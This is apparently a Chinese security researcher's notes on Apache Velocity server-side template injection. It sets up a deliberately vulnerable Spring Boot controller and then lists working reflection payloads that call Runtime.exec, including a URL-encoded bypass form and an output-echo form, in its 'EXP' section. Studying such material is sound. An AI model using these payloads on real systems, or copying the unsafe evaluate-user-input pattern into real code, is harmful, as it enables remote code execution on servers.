# Velocity

> 官网: 
>
> 1.https://velocity.apache.org/engine/devel/user-guide.html(模板语法)
>
> 2.https://velocity.apache.org/engine/devel/developer-guide.html(java使用)
>
> 3.https://iwconnect.com/apache-velocity-server-side-template-injection/(一个比较详细的研究)

## 0x01 环境准备

> springboot 从1.5版本之后不再支持Velocity，所以我们使用的是`1.4.6.RELEASE`.

pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>Velocity</artifactId>
    <version>1.0-SNAPSHOT</version>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>1.4.6.RELEASE</version>
    </parent>
    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-velocity</artifactId>
        </dependency>
    </dependencies>

</project>
```

Controller

```java
@RequestMapping("/velocity")
    public void velocity(String template) {
        //Initialize Velocity
        Velocity.init();
        //Create a Context object
        VelocityContext context = new VelocityContext();
        //Add your data objects to the Context.
        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");
        //get template
        //Template template1 = null;
        //template1 = Velocity.getTemplate("hello.html");
        StringWriter swOut = new StringWriter();
        //'Merge' the template and your data to produce the ouput.
        Velocity.evaluate(context, swOut, "test", template);
    }
```

## 0x02 velocity模板解析过程

```java
render:342, SimpleNode (org.apache.velocity.runtime.parser.node)
render:1378, RuntimeInstance (org.apache.velocity.runtime)
evaluate:1314, RuntimeInstance (org.apache.velocity.runtime)
evaluate:1265, RuntimeInstance (org.apache.velocity.runtime)
evaluate:180, Velocity (org.apache.velocity.app)
velocity:41, MainController (com.dem0.Application.controller)
```

总的来说就是，`RuntimeInstance#parse`去解析，把输入的`template`通过解析成不同的`SimpleNode`,最后调用`render`来执行处理。

## 0x03 velocity使用

> 参考:https://velocity.apache.org/engine/devel/vtl-reference.html

**$** [ **!** ] [ **{** ] *identifier* [ [ **|** *alternate value* ] **}** ]

> 就问一句:像不像log4j，解析方式差不多

 **#** [ **{** ] **set** [ **}** ] **(** *$ref* **=** [ **"**, **'** ] *arg* [ **"**, **'** ] )

> 赋值
>
> include(引入，但是不会解析)
>

**#** [ **{** ] **parse** [ **}** ] **(** *arg* **)**

> parse(Renders a local template that is parsed by Velocity)
>
> - String: `#parse( "lecorbusier.vm" )`
> - Variable: `#parse( $foo )`
>
> See *directive.parse.max_depth* in `velocity.properties` to change from parse depth.

**#** [ **{** ] **evaluate** [ **}** ] **(** *arg* **)**

> 感觉和上面差不多?

- 总结

  - 不难发现这个玩意有一点点php的味道在里面，比如屏蔽关键字啥的可以绕过

  ```
  %23set(%24e%3D%22Runtime%22)%0A%24%7Be.getClass().forName(%22java.lang.%24e%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22calc%22)%7D
  ```
    - 因为初始化的`context`,没有内部暴露的对象，所以可玩性极低。

​    

## 0x04 EXP

```
#set($e="e")
#set($a=e.getClass().forName("java.lang.Runtime"))
${.Runtime}.invoke(null,null).exec("calc")}
```



```java
#set($e="e")
${e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}
```

这个可以很简单的理解了，`"".getClass()`没有调试的必要。

```java
回显
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character')) 
#set($str=$x.class.forName('java.lang.String')) 
#set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() 
#set($out=$ex.getInputStream()) 
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))
#end
```

实际影响

> `CVE-2019-3396`.就是直接加载远程文件+SSTI就可以RCE.
>
> `Apache solr Velocity `:https://xz.aliyun.com/t/7466#toc-8

## 0x05 up!

![image-20220604210423940](https://img.dem0dem0.top/images/image-20220604210423940.png)

​	看到这个的第一反应就是`TemplatesImpl`和`getOutputProperties`。